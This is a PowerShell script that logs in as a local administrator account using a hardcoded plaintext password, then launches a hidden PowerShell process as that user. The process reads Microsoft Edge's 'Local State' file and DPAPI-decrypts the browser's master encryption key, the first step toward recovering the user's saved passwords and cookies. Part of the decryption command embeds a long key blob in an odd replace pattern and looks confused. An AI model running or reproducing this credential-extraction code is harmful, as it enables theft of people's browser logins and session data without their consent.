Add-Type -AssemblyName System.Security
$secpass = "Pokemon55" | ConvertTo-SecureString -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("laptop-nstd8t96\osiris_admin", $secpass)

Write-Output "Credential created: $($cred.UserName)"

# Try using Start-Process with credential
try {
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = "powershell.exe"
    $processInfo.RedirectStandardOutput = $true
    $processInfo.RedirectStandardError = $true
    $processInfo.UseShellExecute = $false
    $processInfo.CreateNoWindow = $true
    $processInfo.UserName = "osiris_admin"
    $processInfo.Domain = "laptop-nstd8t96"
    $processInfo.Password = $cred.Password
    $processInfo.LoadUserProfile = $true
    $processInfo.Arguments = "-NoLogo -NoProfile -Command `"`$env:username; [System.Security.Cryptography.ProtectedData]::Unprotect((Get-Content 'C:\Users\osiris_admin\AppData\Local\Microsoft\Edge\User Data\Local State' | ConvertFrom-Json).os_crypt.encrypted_key -replace '^RFBBUEkB','' -replace '^AAAAI0yd3wEV0RGMegDAT8KX6wEAAACkEzgEGa0JRJ4edP9GSWbLEAAAAB4AAABNAGkAYwByAG8AcwBvAGYAdAAgAEUAZABnAGUAAAAQZgAAAAEAACAAAADmcFZEDOL+Rajp1nViYPoOPZ0Q9oGTJTxsvYUJWPwIUQAAAAAOgAAAAAIAACAAAABn/geJ/7q1KLFKu8CyZAfIj24S5hJ3B7e+NPtT1ZpNujAAAAAD+erWwb3TJevUVCr4qwcusXVLvmilASAnt/+kIrnNqiRNCMI7EWKSJIVCNWx99CJAAAAAwVZhL3rGMDlWKujjgTT8/2HybRhEo/md7IR+wzHhPoNEzfApOP8z2gOOPWLepJX2VmJPZiJNgfNueka9d6Wpdg==' | % { [System.Convert]::FromBase64String(`$_) }, `$null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser) | % { [System.BitConverter]::ToString(`$_) }`""
    
    $p = [System.Diagnostics.Process]::Start($processInfo)
    $p.WaitForExit(10000)
    $stdout = $p.StandardOutput.ReadToEnd()
    $stderr = $p.StandardError.ReadToEnd()
    Write-Output "Exit code: $($p.ExitCode)"
    Write-Output "STDOUT: $stdout"
    if ($stderr) { Write-Output "STDERR: $stderr" }
}
catch {
    Write-Output "Exception: $_"
    Write-Output $_.ScriptStackTrace
}
